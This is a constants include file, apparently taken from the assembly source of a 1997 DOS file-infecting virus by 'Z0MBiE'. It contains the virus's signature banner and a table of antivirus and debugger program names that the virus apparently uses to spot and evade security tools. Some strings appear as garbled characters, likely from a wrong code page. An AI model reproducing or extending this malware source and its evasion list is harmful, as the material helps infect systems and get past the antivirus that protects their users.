   ; - -[CONST.INC]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8

                   db 13,10,10
                   db 'Z0MBiE`'
                   IF VIR_SIZE GE 1000
                   db vir_size / 1000 mod 10 + '0'
                   ENDIF
                   db vir_size /  100 mod 10 + '0'
                   db vir_size /   10 mod 10 + '0'
                   db vir_size /    1 mod 10 + '0'
                   db ' v1.00 (c) 1997 Z0MBiE',13,10
                   db 'Tnx to S.S.R.',13,10
                   db 'ShadowRAM/Virtual Process Infector',13,10
                   DB 'ShadowRAM Technology (c) 1996,97 Z0MBiE',13,10

                   ; ¯®å¥à¨¬ ¨å ;)

   bad:            db 'ADINFù£ ¢®'
                   db 'AIDSù¯®£ ì'
                   db 'AVPùùá ªáùù'
                   db 'WEBùùã©®¡®ª'
                   db 'DRWEBùâ®¦¥ù'
                   db 'ùåã©ïùù°°°'
                   db 'ù¤¥àì¬®ùCPP'
                   db '¥ ¢¨¦ãC  '
                   db 'S-ICEùàã«¥§'
                   db 'TDù¬ áâù¤ ©'
                   db 'DEBUGùù£ã¤ù'
                   db 'WEB70801íâ®'
                   db 'CAù¬®ñùùAVù'
   bad_end:
